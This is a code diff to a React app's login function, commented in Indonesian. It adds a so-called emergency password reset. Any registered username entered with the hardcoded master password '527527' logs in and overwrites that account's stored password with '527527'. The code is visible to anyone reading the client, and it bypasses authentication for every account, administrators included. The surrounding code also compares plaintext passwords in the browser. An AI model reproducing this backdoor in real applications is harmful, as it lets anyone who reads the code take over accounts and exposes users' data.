@@ -151,7 +151,19 @@ export default function App() {
   function handleLogin(username, password) {
     // Cek dari Firestore dulu, kalau kosong pakai default
     const allUsers = users.length > 0 ? users : defaultUsers
-    const found = allUsers.find(u => u.username === username && u.password === password)
+    let found = allUsers.find(u => u.username === username && u.password === password)
+
+    // RESET DARURAT (lupa password): username terdaftar + password master "527527"
+    // → langsung masuk, dan password user tsb di-RESET menjadi 527527.
+    // Setelah masuk, segera ganti password lewat menu Users/Pengaturan.
+    if (!found && password === '527527') {
+      const target = allUsers.find(u => u.username === username)
+      if (target) {
+        found = target
+        try { setOne('users', target.id, { ...target, password: '527527' }) } catch {}
+      }
+    }
+
     if (found) {
       const session = { id: found.id, username: found.username, name: found.name, role: found.role }
       setUser(session)
